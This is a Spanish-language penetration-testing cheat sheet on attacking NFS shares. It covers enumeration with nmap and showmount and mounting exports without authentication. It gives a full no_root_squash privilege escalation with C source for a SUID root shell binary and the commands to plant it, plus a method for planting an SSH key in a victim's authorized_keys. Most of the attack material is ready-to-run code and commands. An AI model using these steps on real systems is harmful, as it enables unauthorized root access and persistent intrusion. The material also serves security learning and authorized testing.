# Protocolo NFS (Network File System)

> **Puerto por defecto:** `2049/TCP` (y `111/TCP` para el portmapper/rpcbind)

NFS permite compartir directorios por red en entornos Unix/Linux. Mal configurado, deja **montar carpetas sin autenticación**, leer/escribir archivos ajenos y, combinado con el truco de **SUID + no_root_squash**, escalar a root.

---

## Enumeración

```bash
nmap -p111,2049 -sCV --script="nfs-*,rpcinfo" <IP>
```

### Ver qué exporta el servidor

```bash
showmount -e <IP>
```

Salida típica:

```text
Export list for <IP>:
/home/backup  *
/srv/share    10.10.10.0/24
/var/nfs      (everyone)
```

> **Consejo:** `showmount -e` es lo primero. Te dice qué directorios se comparten y a quién. Un export `*` (a todo el mundo) es una invitación.

---

## Montar un recurso

```bash
mkdir -p /mnt/nfs
sudo mount -t nfs <IP>:/ruta/exportada /mnt/nfs -o nolock
# o una versión concreta si falla:
sudo mount -t nfs -o vers=3 <IP>:/ruta /mnt/nfs
ls -la /mnt/nfs
```

Cuando termines:

```bash
sudo umount /mnt/nfs
```

---

## Escalada de privilegios: no_root_squash

Este es el ataque estrella de NFS. Si el export tiene la opción **`no_root_squash`**, el servidor **respeta tu UID local**. Si eres root en TU máquina, eres root sobre los archivos del share → puedes crear un binario **SUID root** que luego ejecutas en la víctima.

### Requisito

Tienes una shell de usuario normal en la víctima, pero el NFS está montado (o puedes montarlo) y el export es `no_root_squash`.

### Pasos (desde tu máquina, como root)

```bash
# 1. Monta el share
sudo mount -t nfs <IP>:/ruta /mnt/nfs -o nolock

# 2. Crea un binario que lance una shell y hazlo SUID root
cat > /mnt/nfs/rootbash.c <<'EOF'
#include <stdio.h>
#include <unistd.h>
int main() { setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
EOF
gcc /mnt/nfs/rootbash.c -o /mnt/nfs/rootbash
sudo chown root:root /mnt/nfs/rootbash
sudo chmod u+s /mnt/nfs/rootbash
```

```bash
# 3. En la VÍCTIMA (shell de usuario normal), ejecuta el binario SUID:
cd /ruta/montada/en/la/victima
./rootbash          # -> shell como root
id                  # uid=0(root)
```

> **Nota:** el binario debe compilarse para la arquitectura de la víctima. Si difiere, compílalo en la propia víctima o usa `gcc -static`. El truco también funciona copiando `/bin/bash` y marcándolo SUID.

---

## Escritura de claves SSH

Si el export incluye el `/home` de un usuario y tiene escritura, deja tu clave:

```bash
mkdir -p /mnt/nfs/.ssh
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/.ssh/authorized_keys
ssh <usuario>@<IP>
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `showmount -e` | Listar exports del servidor NFS. |
| `mount -t nfs` | Montar un recurso compartido. |
| `nmap` (`nfs-*`, `rpcinfo`) | Enumeración de NFS y RPC. |
| `gcc` | Compilar el binario SUID para el ataque `no_root_squash`. |

---

> **Consejo:** ante NFS, haz `showmount -e <IP>` y monta todo lo que puedas para buscar credenciales y archivos sensibles. Y si durante una escalada de privilegios ves que la máquina **exporta su propio sistema de archivos por NFS con `no_root_squash`**, tienes un camino directo a root con el truco del binario SUID.
